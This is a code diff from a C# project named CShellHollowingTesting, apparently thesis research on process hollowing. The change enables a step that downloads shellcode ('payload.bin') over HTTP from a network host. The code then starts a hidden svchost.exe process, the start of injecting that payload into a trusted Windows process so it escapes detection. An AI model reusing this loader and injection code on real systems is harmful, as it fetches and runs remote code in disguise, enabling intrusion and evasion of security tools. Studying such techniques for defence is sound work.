@@ -75,33 +75,16 @@ namespace CShellHollowingTesting
     {
       List<byte> shellcodeList = new List<byte>();
 
-      //var httpClient = new HttpClient();
-      //var shellcode = await httpClient.GetByteArrayAsync("http://192.168.0.187/bypass.bin");
+      var httpClient = new HttpClient();
+      var shellcode = await httpClient.GetByteArrayAsync("http://192.168.0.187/payload.bin");
 
-      //var shellcode = File.ReadAllBytes("F:\\FH_Technikum_Wien\\Masterarbeit\\SimpleCShell\\SimpleCShell\\reverseshellopcodes.txt");
-      var shellcode = File.ReadAllBytes("F:\\FH_Technikum_Wien\\Masterarbeit\\SimpleCShell\\SimpleCShell\\test.bin");
+      Console.WriteLine("Fetched");
       PROCESS_INFORMATION proc_info = new PROCESS_INFORMATION();
       STARTUPINFO startup_info = new STARTUPINFO();
       PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
       string targetPath = @"C:\\Windows\\System32\\svchost.exe";
       var procINIT = CreateProcessA(null, targetPath, IntPtr.Zero, IntPtr.Zero, false, CreationFlags.CREATE_NO_WINDOW,
                       IntPtr.Zero, null, ref startup_info, ref proc_info);
-
-      Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "UserConfig", $"PID:{proc_info.dwProcessId}", RegistryValueKind.String);
-
-      bool isReady;
-
-      //do
-      //{
-      //  var regValue = Registry.GetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "UserConfig", null);
-
-      //  isReady = regValue != null && regValue.ToString().ToLower() == "1";
-      //  Thread.Sleep(16);
-      //}
-      //while (!isReady);
-
-      //File.Create("F:\\FH_Technikum_Wien\\Masterarbeit\\SimpleCShell\\SimpleCShell\\success.data");
-
       
       uint retLength = 0;
       IntPtr procHandle = proc_info.hProcess;
